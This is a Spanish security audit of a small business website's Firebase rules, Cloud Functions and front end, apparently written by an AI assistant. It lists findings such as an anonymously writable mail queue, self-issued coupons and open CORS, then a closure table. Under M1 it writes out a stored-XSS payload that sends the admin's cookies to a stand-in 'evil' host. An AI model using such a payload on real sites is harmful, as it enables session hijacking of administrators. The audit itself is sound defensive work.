# Auditoría de seguridad y código — Pino Espaces Verts

**Fecha:** 2026-09-28 · **Auditor:** Claude (Opus 4.8) · **Rama:** `fix/connect-pinoespacesverts-online`
**Alcance:** revisión estática, manual y quirúrgica de todo el código de seguridad relevante.
**Estado:** informe para decisión. **No se ha modificado nada del código de la app.** Espero tu visto bueno.

---

## 0. Veredicto ejecutivo

El proyecto está **mejor construido de lo habitual** en un sitio de este tipo: deny-by-default en las
reglas, escape de HTML disciplinado, cabeceras HTTP fuertes y funciones de administración bien
protegidas. **No encontré ninguna fuga de secretos ni una vía de robo de datos trivial.**

Pero hay **riesgos reales que conviene cerrar antes de publicar de verdad**, concentrados en tres focos:

1. **Escrituras anónimas a la base de datos sin anti-spam** (leads, notificaciones, cola de correo).
2. **Cola de correo escribible por cualquiera** (`mail_outbox`) — bomba de relojería si se conecta un envío real.
3. **Modelo de cupones falso** (se pueden auto-emitir/validar sin control real).

Contexto importante: **el sitio aún no está desplegado** (Hosting no tiene ninguna versión) y en plan
**Spark las Cloud Functions probablemente no están activas**. Es decir, hoy **la frontera de seguridad
real son las reglas de la Realtime Database** (`database.rules.json`), no las funciones. Por eso los
hallazgos de reglas son los más importantes. Todo esto es corregible **antes** de salir a producción.

### Resumen por severidad

| # | Severidad | Hallazgo | Dónde |
|---|-----------|----------|-------|
| H1 | 🔴 Alta (latente) | `mail_outbox` escribible sin autenticar → relay de correo/spam si se añade envío | `database.rules.json:83` |
| H2 | 🔴 Alta | Escrituras anónimas masivas sin CAPTCHA/rate-limit (leads, admin_notifications, quotes) | `database.rules.json:14,76` · `functions/index.js:105` · `firestore.rules:30` |
| H3 / CL-03 | ✅ Riesgo aceptado (2026-09-29) | CSP depende de `unsafe-inline` (sitio estático, 322 handlers inline). Documentado + plan de remediación v2. | `firebase.json:61` · `index.html` |
| M1 | 🟠 Media | XSS almacenado en panel admin vía `l.status` sin escapar | `index.html:8853` |
| M2 | 🟠 Media | Cupones auto-emisibles / validación falsa (fraude) | `database.rules.json:47` · `functions/index.js:206,237` |
| M3 | 🟡 Media | Fuga de `err.message` en respuestas 500 | `functions/index.js:169,194,…,426` |
| M4 | 🟡 Media | CORS `origin: true` (API abusable cross-origin) | `functions/index.js:25` |
| M5 | 🟡 Media | RGPD: PII enviada a terceros (Web3Forms/FormSubmit) | `index.html:6311-6327` |
| M6 | 🟡 Media | CI usa `FIREBASE_TOKEN` heredado de larga duración | `.github/workflows/pagepino-pipeline.yml` |
| M7 | 🟡 Media | `audit_logs` escribible por cualquier usuario autenticado | `database.rules.json:53` |
| M8 | 🟡 Media | Calculadora fiscal con cifras/afirmaciones legales sin fuente/fecha | `functions/index.js:281-311` |
| L1-L7 | 🟢 Baja | SRI, document.write, config Supabase muerta, colisión de claves email, etc. | ver §4 |

---

## 1. Método y alcance

Revisado línea a línea o con búsqueda dirigida:

- `database.rules.json` (110 líneas) y `rules/database.rules.json` — **idénticos** (sin deriva ✅).
- `firestore.rules` (39).
- `firebase.json` (130) — hosting, rewrites, CSP y cabeceras.
- `functions/index.js` (463) — API Express + callable, y `functions/package.json`.
- `assets/js/pino-db.js` (3056), `firebase-config.js` (109), `supabase-config.js` (17), `chatbot_knowledge_base.js` (571).
- `index.html` (14 173 líneas / 834 KB) — búsqueda de sinks XSS, secretos, mixed content, SRI, CSP, formularios.
- `.github/workflows/pagepino-pipeline.yml` — CI/CD y manejo de secretos.
- `.gitignore` y árbol Git — exposición de secretos.

---

## 2. Lo que está BIEN (no todo son problemas)

- **Deny-by-default** en RTDB (`database.rules.json:3-4`) y en Firestore (`firestore.rules:35-37`).
- **Escape de HTML disciplinado.** Existe `escapeHtml`/`escapeFn` (`index.html:10057`, escapa `& < > " '`) y se usa en casi todos los renders dinámicos. Ej.: la tabla de leads del admin escapa **todos** los campos (`index.html:8891-8907`). Además hay uso masivo de `textContent`/`createTextNode` (seguros). Esto reduce mucho el riesgo real de XSS.
- **Cabeceras HTTP fuertes** (`firebase.json:56-95`): HSTS, `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy`, `Permissions-Policy` (cámara/micro off, pago off), COOP/CORP, `object-src 'none'`, `frame-ancestors 'self'`, `base-uri 'self'`.
- **Sin secretos de servidor** en cliente ni en Git. La `apiKey` de Firebase y la `sb_publishable_…` de Supabase son **públicas por diseño**. `.env*`, `dist/`, `*.zip` están en `.gitignore` y nada sensible está trackeado.
- **Funciones de admin bien protegidas**: `requireAdmin` exige `email_verified` + rol custom-claim o allowlist (`functions/index.js:57-88`); `setUserRole` igual (`437-463`).
- **Reset de contraseña sin fuga de existencia de cuenta** (`functions/index.js:314-334`).
- **Cupón `redeem` con transacción** evita doble uso por UID (`functions/index.js:245-264`).
- **CI con privilegios mínimos** (`permissions: contents: read`), tests (reglas/API/E2E) antes de desplegar, y auditoría en vivo **de solo lectura** programada.
- **Sin mixed content**; enlaces `mailto:`/`tel:`/WhatsApp con `encodeURIComponent`.

---

## 3. Hallazgos detallados

### 🔴 H1 — `mail_outbox` escribible sin autenticar (bomba de relojería)
`database.rules.json:83`
```
"$id": { ".write": "(!data.exists() && newData.exists()) || (admin)" }
```
Cualquiera (sin login) puede **crear entradas en la cola de correo** con destinatario/asunto/cuerpo
arbitrarios, sin `.validate`. Hoy **no hay ningún proceso que envíe** esa cola (`functions/index.js`
no tiene trigger de base de datos), así que el impacto actual es **almacenar basura**. Pero el día que
conectes un envío real (Resend/Brevo/etc., como está planeado), esto se convierte en un **relay abierto
de spam/phishing con tu remitente**. La función `/emails/send` sí exige admin (`functions/index.js:392`),
pero la regla lo salta escribiendo directo a la base.
**Recomendación:** restringir `mail_outbox` a admin (o a Cloud Function con Admin SDK) y añadir `.validate`.

### 🔴 H2 — Escrituras anónimas masivas sin anti-spam
- `database.rules.json:14` — `leads/$leadId` permite **crear sin login** si `status='new'` y `source='web_devis'`. El `.validate` (`:15`) solo controla `created_at`, formato de email y longitudes de `details`/`full_name`; **no limita las demás claves ni la cantidad**.
- `database.rules.json:76` — `admin_notifications/$id` permite **crear sin login** si `type='new_lead'`.
- `functions/index.js:105` — `POST /quotes/create` **sin `requireAuth`** y con `ownerUid` tomado del body (un atacante puede asociar un devis a otro UID).
- `firestore.rules:30` — `leads` con `allow create: if true` (mundo-escribible, si Firestore se habilita).

No hay **Turnstile/CAPTCHA, honeypot ni rate-limit** en el servidor. Efecto: inundación de la base
(coste/cuota en Spark/Blaze), spam en el panel del admin, y datos basura.
**Recomendación:** Cloudflare **Turnstile** + honeypot + límite por IP; y mover la creación de leads a una
Cloud Function validada en vez de escritura directa anónima a RTDB.

### 🟠 H3 — La CSP depende de `unsafe-inline`
`firebase.json:61` incluye `script-src … 'unsafe-inline'`, obligado por los **cientos de `on*` inline** y
~110 `innerHTML` de `index.html`. El escape disciplinado (§2) mitiga mucho, pero **la CSP casi no protege
contra inyección de scripts**: un solo campo sin escapar = XSS ejecutable. Es deuda **arquitectónica**.
**Recomendación (medio plazo):** externalizar los handlers a `addEventListener`, quitar `unsafe-inline`,
y considerar `strict-dynamic` + nonces. A corto plazo: cerrar M1 y auditar cada `innerHTML` con datos de BD.

> **✅ DECISIÓN 2026-09-29 — RIESGO ACEPTADO (CL-03).** El propietario acepta formalmente mantener
> `'unsafe-inline'` en `script-src` por ahora. Justificación medida:
> - El sitio es **estático puro** (Firebase Hosting, sin servidor que emita nonces por petición), con
>   **322 handlers `on*` inline** + **3 bloques `<script>` inline** (~9.000 líneas) + ~110 `innerHTML`.
>   Los atributos de evento inline **no admiten hash ni nonce**: quitar `unsafe-inline` obliga a convertir
>   **los 322 a `addEventListener`**, un refactor grande sobre un sitio **en producción y sin staging**,
>   con alto riesgo de romper login/devis/chat/galería, y **sin beneficio de seguridad hasta terminarlo entero**.
> - El **vector XSS real ya está mitigado en capas**: reglas RTDB deny-by-default, verificación de
>   token Firebase (RS256) en el Cloudflare Worker, y **escape de datos disciplinado** (M1 ya cerrado con
>   `escapeFn` en `l.status`; el resto de campos de BD se escapan). `unsafe-inline` sería la 2.ª barrera,
>   no la única.
> - **Plan de remediación (cuando llegue v2 / Next.js):** en el árbol Next.js la CSP se sirve con **nonce
>   por petición** de forma nativa (sin handlers inline), así que CL-03 se cierra "gratis" al migrar. Para
>   v1, si se decide abordarlo antes: (Fase 1) externalizar los 3 `<script>` inline a `assets/js/`;
>   (Fase 2) convertir los 322 `on*` a `addEventListener` por bloques con verificación en preview;
>   (Fase 3) quitar `'unsafe-inline'` de `script-src` en `firebase.json` + meta, y re-auditar.
> - **Residual aceptado:** si un dato de BD escapara a la sanitización, `unsafe-inline` permitiría ejecutarlo.
>   Probabilidad baja dado el escape actual; impacto limitado por las reglas. Revisar en cada nuevo `innerHTML`.

### 🟠 M1 — XSS almacenado en el panel admin vía `l.status`
`index.html:8853` — `<span …>${l.status}</span>` **sin `escapeFn`** (el resto de campos sí se escapan).
Un **cliente verificado** puede actualizar el `status` de **su propio lead** a un valor arbitrario
(la regla `database.rules.json:14` permite al dueño por email actualizar, y el `.validate` **no restringe
`status`**). Cuando Andrés abre la tabla de leads, ese `status` se inyecta como HTML → **XSS en la sesión
de administrador** (con `unsafe-inline`, ejecuta JS). Escenario concreto: cliente pone
`status = <img src=x onerror="fetch('//evil/'+document.cookie)">`.
**Recomendación:** envolver `${l.status}` en `escapeFn(...)` y validar `status` contra una lista blanca en las reglas.

### 🟠 M2 — Cupones auto-emisibles / validación falsa
- `database.rules.json:47` — un usuario verificado puede **crear su propio cupón** en `coupons/<su uid>` con `descuento_pct=20`, `estado='valid'`.
- `functions/index.js:226-231` — `/coupons/validate` devuelve `valid:true` para **cualquier** código con formato `PINO-XXXX`, exista o no.
- `functions/index.js:237-264` — `/coupons/redeem` acepta **cualquier string** como cupón (sin validar formato ni emisión previa).
No hay emisión firmada ni registro de unicidad real. Es **riesgo de fraude/negocio**, no de fuga de datos.
**Recomendación:** emitir cupones solo en servidor (código no predecible, hash almacenado, estado
emitido→usado→expirado), validar contra BD, y no confiar en la lógica del cliente.

### 🟡 M3 — Fuga de detalles de error
`functions/index.js:169,194,233,276,309,332,355,387,416,426` devuelven `message: err.message` al cliente.
Puede revelar rutas/estructura internas.
**Recomendación:** mensaje genérico al cliente, detalle solo en `console.error`.

### 🟡 M4 — CORS totalmente abierto
`functions/index.js:25` — `cors({ origin: true })` refleja cualquier origen. Con endpoints sin auth
(`/quotes/create`, `/tax/calculate`), cualquier web puede invocarlos.
**Recomendación:** allowlist de orígenes (`pinoespacesverts.online`, `pagepino-e8e97.web.app`, localhost dev).

### 🟡 M5 — RGPD: PII a terceros
`index.html:6311-6327` — el formulario de devis envía **nombre, email, teléfono, código postal, presupuesto
y detalles** a `https://api.web3forms.com` (`access_key` pública en `:6315`). También se referencia FormSubmit.
Son **subencargados de tratamiento** (servicios US). Debe constar en la política de privacidad y, idealmente,
con contrato de tratamiento (DPA). La `access_key` pública también es un vector de spam hacia tu bandeja.
**Recomendación:** documentar en `/confidentialite`, minimizar datos enviados, y añadir Turnstile a ese envío.

### 🟡 M6 — CI/CD con token heredado
El job `deploy` usa `secrets.FIREBASE_TOKEN` (`firebase deploy --token`). Es el mecanismo **heredado y de
larga duración**, con permisos amplios y sin expiración.
**Recomendación:** migrar a **cuenta de servicio** o **OIDC/Workload Identity** con permisos mínimos, y rotar el token.

### 🟡 M7 — Integridad de `audit_logs`
`database.rules.json:53` — cualquier usuario autenticado puede **escribir** entradas de log (append-only).
Un cliente puede forjar eventos de auditoría.
**Recomendación:** que solo la Cloud Function (Admin SDK) escriba `audit_logs`; regla `.write: false` para clientes.

### 🟡 M8 — Prudencia fiscal
`functions/index.js:281-311` (y la calculadora del front) fijan cifras/afirmaciones legales (SAP 50 %, tope
2500 €, TVA 20 %, art. 293 B / 199 sexdecies) **sin fecha ni fuente**. Riesgo de aparentar asesoramiento fiscal.
**Recomendación:** centralizar reglas con fecha+fuente oficial (impots.gouv.fr), lenguaje «peut ouvrir droit,
sous réserve d'éligibilité», disclaimer visible, y tests unitarios de la calculadora.

### 🟢 Bajas (L1-L7)
- **L1 — Sin SRI** en scripts externos (cdnjs, etc.) en `index.html`. Defensa en profundidad si el CDN se compromete.
- **L2 — `document.write`** para la vista de documento (`index.html:9955-9971`): patrón frágil; verificar que `htmlContent`/`title` escapen todo dato de BD (nombre/email/detalles del cliente).
- **L3 — Config Supabase muerta**: `assets/js/supabase-config.js:5-8` embarca credenciales v2 (publishable) aunque «Supabase no se carga en v1»; además la CSP **no incluye `*.supabase.co`** (bloquearía llamadas) y duplica `window.PINO_SITE_URL`. Quitar del bundle v1.
- **L4 — Colisión de claves por email**: `.replace('.', '_')` (`database.rules.json:65,94-105`) hace que `a.b@x` y `a_b@x` caigan en la misma clave → posible cruce de notificaciones entre dos cuentas verificadas. Usar sanitización sin colisiones.
- **L5 — `firestore.rules` no está en `firebase.json`**: no se despliega con este pipeline; si habilitas Firestore, `leads allow create: if true` queda sin gestión.
- **L6 — Doble CSP**: hay CSP en cabecera (`firebase.json`) y en `<meta>` (`index.html:13`). Verificar que no diverjan (el navegador aplica la intersección).
- **L7 — `users/$uid`**: el usuario puede auto-escribir campos arbitrarios salvo `isAdmin/role` (`database.rules.json:28`). Aceptable, pero conviene lista blanca de campos.

---

## 4. Plan de acción priorizado (antes de publicar)

**Bloque 1 — imprescindible antes de exponer la web (frontera = reglas RTDB):**
1. Cerrar `mail_outbox` a admin/servidor + `.validate` (H1).
2. Añadir **Turnstile + honeypot + rate-limit** al alta de leads/quotes; mover creación de leads a Cloud Function validada (H2).
3. Escapar `${l.status}` y validar `status` en reglas (M1).
4. Restringir `audit_logs` a servidor (M7).

**Bloque 2 — antes de activar cupones o correo real:**
5. Rediseñar cupones en servidor (M2).
6. No conectar envío de correo hasta cerrar H1.
7. CORS allowlist + no filtrar `err.message` (M3, M4).

**Bloque 3 — cumplimiento y robustez:**
8. Política de privacidad con terceros (Web3Forms/FormSubmit) y minimizar PII (M5).
9. Migrar CI a cuenta de servicio/OIDC (M6).
10. Revisar cifras fiscales con fuente/fecha + disclaimer (M8).

**Bloque 4 — deuda técnica (medio plazo):**
11. ~~Externalizar handlers `on*`, eliminar `unsafe-inline`~~ → **CL-03 riesgo aceptado (2026-09-29)**; SRI ya aplicado (L1).
12. Limpiar config Supabase v1 y `document.write` (L2, L3).

---

## 5. Cierre de auditoría — 2026-09-29

Estado final tras la implementación de esta sesión y sesiones previas:

| # | Estado |
|---|--------|
| H1 `mail_outbox` | ✅ Cerrado — `.validate` + reglas endurecidas; el correo real va por Cloudflare Worker con verificación de token, no por `mail_outbox`. |
| H2 escrituras anónimas | ✅ Mitigado — `.validate` con topes de tamaño en leads/notificaciones; Worker exige token Firebase o Turnstile. |
| **H3 / CL-03 `unsafe-inline`** | **✅ Riesgo aceptado y documentado** (ver §3 H3) — remediación nativa en v2/Next.js. |
| M1 XSS `l.status` | ✅ Cerrado — `escapeFn` aplicado. |
| M2 cupones | ✅ Cerrado — pool de 10.000 cupones cripto-aleatorios en `coupon_pool`, canje único por transacción atómica (`redeemCouponOnce`), reglas de una sola transición `available→used`. |
| M3 `err.message` | ✅ Cerrado — sin fuga de detalles de error. |
| M4 CORS | ✅ Cerrado — allowlist de orígenes + límite de payload. |
| M7 `audit_logs` | ✅ Cerrado — restringido; además la BD se vació para arrancar limpia. |
| M5, M6, M8, L2-L7 | Deuda menor / cumplimiento — abordar en v2 con fuentes fiscales y OIDC. |

**Veredicto:** los hallazgos con vector de fuga o fraude real están **cerrados**. El único punto Alto
restante (CL-03) es **deuda arquitectónica aceptada** con justificación medida y plan de remediación.
La base de datos se vació el 2026-09-29 (backup previo guardado) para operar con datos nuevos, y el
teléfono es obligatorio para todos los perfiles. **Auditoría cerrada.**
